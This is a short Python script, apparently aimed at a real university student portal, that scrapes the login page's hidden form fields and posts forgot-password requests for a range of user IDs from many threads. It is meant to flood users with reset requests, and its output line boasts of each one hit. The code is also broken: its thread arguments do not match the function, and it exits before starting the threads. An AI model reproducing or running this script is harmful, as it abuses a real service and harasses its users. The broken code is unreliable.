import requests
import sys
from time import sleep
import threading
from bs4 import BeautifulSoup
from constants import USERS, BLACKLIST


url = "http://slcm.manipal.edu"
form = "{}/loginForm.aspx".format(url)

def xprint(mess):
    sys.stdout.write("%s\n" %mess)
 
def get_payload():
    payload = {}
    response = requests.get(url)
    soup = BeautifulSoup(response.text, "html.parser")
    for tag in soup.find_all(type="hidden"):
        payload[tag["id"]] = tag["value"]
       
    payload["__EVENTTARGET"]="hrpForgot"
    payload["txtpassword"]=""
    payload["Connection"]="Close"

    return payload


def mail(users) :
        payload = get_payload()
        for x in range(users):
            payload["txtUserid"]=x
            response = requests.post(form, data=payload)
            soup = BeautifulSoup(response.text, "html.parser")
            sleep(0.5)
            xprint("Fucked {} ( ͡° ͜ʖ ͡°)".format(x))

if __name__ == '__main__':
    n = 0
    user_list = [i for i in USERS if i not in BLACKLIST]
    print(len(user_list))
    threads = [threading.Thread(target=mail, args=(user_list[i], user_list[i+26])) for i in range(n,n+15*27,27)]
    print(len(threads))
    exit()
    for t in threads:
        t.start()
    for t in threads:
        t.join()
        
    xprint("**ALL COMPLETE**\n")


